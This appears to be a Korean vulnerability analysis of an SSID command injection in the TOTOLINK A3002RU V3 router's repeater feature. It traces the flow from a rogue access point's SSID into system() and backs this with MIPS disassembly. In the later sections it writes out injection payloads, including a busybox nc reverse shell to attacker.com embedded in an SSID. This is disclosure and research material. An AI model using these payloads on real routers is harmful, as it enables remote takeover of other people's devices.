# 📡 TOTOLINK Repeater SSID Command Injection 분석

> TOTOLINK A3002RU V3 Firmware 기반 Repeater / Site Survey 취약점 분석

---

## 📌 1. Background

• 공유기 웹 관리 인터페이스 존재  
• Repeater (Site Survey) 기능 제공  
• 외부 환경 입력(SSID) 처리 구조 존재  
• 내부 명령 실행 구조 포함 → 보안 검증 필요  

---

## 🎯 2. Target

**Product**  
`TOTOLINK A3002RU V3`

**Binary**  
`/bin/boa`

**Interface**  
`Web Interface (/boafrm/)`

**Role**  
`Wireless configuration / repeater control`

---

## 🔗 3. Data Flow Structure


[ External Input (SSID) ]
↓
[ Site Survey Scan Cache ]
↓
[ MIB (apmib_set) ]
↓
[ Profile Rebuild (apmib_get) ]
↓
[ Command Construction (sprintf) ]
↓
[ system() Execution ]


---

## ⚙️ 4. Command Handling


iwpriv <interface> set_mib ap_profile_add="%s",...


• SSID 값이 `%s`로 삽입됨  
• sprintf로 문자열 구성  
• system()으로 실행됨  

---

## 🔍 5. Verification Result

### ✔️ 입력 처리 특성

• SSID = 외부 AP에서 수신된 값  
• 사용자 선택 후 내부로 전달됨  
• Scan cache → MIB → Profile 경로 확인됨  

---

### ✔️ 데이터 흐름

• `formWlSiteSurvey` → SSID 선택  
• `apmib_set()` → 내부 저장  
• `apmib_get()` → 프로파일 재구성  
• `sprintf()` → 명령 문자열 생성  
• `system()` → 실제 실행  

👉 입력 → 실행까지 완전한 데이터 흐름 존재  

---

### ⚠️ Sanitization 문제

**Escape 처리됨**
- `\`
- `%`
- `"`
- `'`
- `` ` ``

**Escape 처리 안됨**
- `$`
- `(`
- `)`
- `;`
- `#`
- `&`
- `|`
- newline  

---

### ⚠️ 취약 동작


SSID = $(ping attacker.com)


👉 system() 호출 시:


iwpriv ... ap_profile_add="$(ping attacker.com)",...


👉 shell command substitution 실행됨  

---

## 🔐 6. Access Control

### 🔓 Web Interface

• 관리자 인증 필요  
• 로그인 후 접근 가능  

---

### 🌐 Input Source

• SSID = 외부 환경 입력  
• 공격자가 직접 제어 가능  

---

### ⚠️ 특징

• 내부 입력이 아닌 외부 무선 환경 입력  
• 사용자 인지 없이 전달 가능  

---

## 🔄 7. System Relationship


[ Rogue AP (SSID) ]
↓
[ Admin Web UI (Site Survey) ]
↓
[ boa (Handler) ]
↓
[ MIB ]
↓
[ system() ]


• 외부 AP → 내부 설정 → 명령 실행  
• indirect injection 구조  

---

## ⚠️ 8. Impact

• 공유기 명령 실행 (RCE)  
• 시스템 설정 변조 가능  
• 서비스 중단 가능  
• 추가 악성 코드 실행 가능  

---

## 🧩 9. Conclusion

외부에서 제어 가능한 SSID가 내부 설정을 거쳐  
shell 명령으로 실행되는 구조적 취약점 존재  

---

## 💬 One-line Summary

외부 AP의 SSID를 통해  
공유기 내부 명령 실행이 가능한 Repeater 기반 Command Injection 취약점

---

## 🔬 10. Binary Validation (Build: V3.0.0-B20210302.1639)

> `llvm-objdump --triple=mipsel` 기반 정적 분석으로 직접 확인한 결과

### 분석 대상 바이너리

```
work/a3002ru_b20210302/.../squashfs-root-0/bin/boa
Architecture : MIPS32 Little-Endian ELF (stripped, no section headers)
Load mapping : file offset 0x000000 → VA 0x400000
```

### 디스패치 테이블 확인

| 항목 | 값 |
|---|---|
| 핸들러 문자열 | `"formWlSiteSurvey"` (VA `0x45e14c`) |
| 디스패치 테이블 위치 | 파일 오프셋 `~0x743xx` |
| 핸들러 함수 VA | `0x43f1c4` |
| 서브 핸들러 VA | `0x4472f4` (stack size `0x798`) ← 실제 system() 포함 |

### 관련 문자열 (VA)

```
"pocketAP_ssid"                                         : 0x46be60
"iwpriv %s set_mib ap_profile_add=\"%s\",%d,%d"        : 0x46e430
"iwpriv %s set_mib ap_profile_add=\"%s\",%d,%s,"       : 0x46e594
"iwpriv %s set_mib ap_profile_add=\"%s\",%d,0,\"%s\""  : 0x46e5cc
```

### HTTP 파라미터 처리 (pocketAP_ssid)

```asm
; formWlSiteSurvey 핸들러 (0x43f1c4) 내부
0x43f5b8:  lui  $5, 0x47
0x43f5bc:  move $4, $16              ; request object
0x43f5c0:  addiu $5, $5, -0x41a0    ; $5 = 0x46be60 = "pocketAP_ssid"
0x43f5c4:  jal  0x40f2b0             ; get_cgi_param(req, "pocketAP_ssid", output)
0x43f5c8:  addiu $6, $19, -0x2b0    ; delay: $6 = output buffer
0x43f5d0:  sw   $2, 0x220($sp)      ; 반환값(포인터) 저장 → AP 목록 조회 키로 사용
```

`pocketAP_ssid` 값은 스캔 캐시에서 매칭 AP를 찾는 **조회 키**로 사용됨

### SSID 데이터 흐름 (sp+0x66c 추적)

```
getMib($19, sp+0x4d0)     @ 0x4474ec   ← 스캔 캐시에서 선택된 AP의 SSID 읽기
strcpy(sp+0x66c, sp+0x4d0) @ 0x4474f8  ← sp+0x66c = SSID (검증 없음)
```

```asm
; 서브 핸들러 0x4472f4 내
0x4474ec:  move $4, $19              ; AP entry 객체
0x4474f0:  addiu $5, $sp, 0x4d0     ; 출력 버퍼
0x4474f4:  jal  0x472e10             ; getMib(ap_entry, sp+0x4d0)
0x4474f8:  sb   $17, 0x4d0($sp)     ; delay slot

0x4474f8:  addiu $4, $sp, 0x66c     ; destination = sp+0x66c
0x4474fc:  jal  0x4733b0             ; strcpy(sp+0x66c, sp+0x4d0)
0x447500:  addiu $5, $sp, 0x4d0     ; delay: source = getMib 출력
```

### 인젝션 지점 — system() 호출

```asm
; @ 0x4477d0–0x4477e0 (서브 핸들러 0x4472f4)
0x4477c8:  addiu $4, $sp, 0xe8      ; 출력 버퍼
0x4477cc:  addiu $5, $5, -0x1a34    ; $5 = 0x46e5cc = "iwpriv %s ... ap_profile_add=\"%s\",%d,0,\"%s\""
0x4477d0:  addiu $6, $sp, 0x748     ; $6 = 인터페이스명 (e.g. "wlan0")
0x4477d4:  jal  0x4737e0             ; sprintf(sp+0xe8, format, iface, ssid, ...)
0x4477d8:  addiu $7, $sp, 0x66c     ; delay: $7 = sp+0x66c = SSID ← INJECTION
0x4477dc:  jal  0x473400             ; system(sp+0xe8)
```

**핵심 증거**:
- `sp+0x66c` (SSID) → `sprintf` `%s` 인자로 직접 삽입
- SSID에 대한 shell 메타문자 필터링 없음
- 공격자가 제어하는 SSID (`$(cmd)`, `;cmd;` 등)가 그대로 실행됨

### 공격 벡터 상세

```
[공격자 AP 브로드캐스트]
SSID = foo";$(busybox nc attacker.com 4444 -e /bin/sh);"

↓ 라우터가 스캔하여 캐시에 저장

[관리자가 Site Survey 위저드에서 해당 AP 선택]
pocketAP_ssid = "foo\";$(busybox nc ...)\";\"" (URL encoded)

↓ getMib → sp+0x4d0 → strcpy → sp+0x66c

system("iwpriv wlan0 set_mib ap_profile_add=\"foo\";$(busybox nc ...);\"",...) ← 실행
```

### 검증 결론

**CONFIRMED** — B20210302 빌드에서 OTA 스캔 캐시 SSID → `getMib` → `sp+0x66c` → `system("iwpriv ... ap_profile_add=\"%s\"...")` 경로가 검증 없이 직결됨  
공격 벡터: **무선 인접(RF) + HTTP** (관리자 UI를 통한 트리거)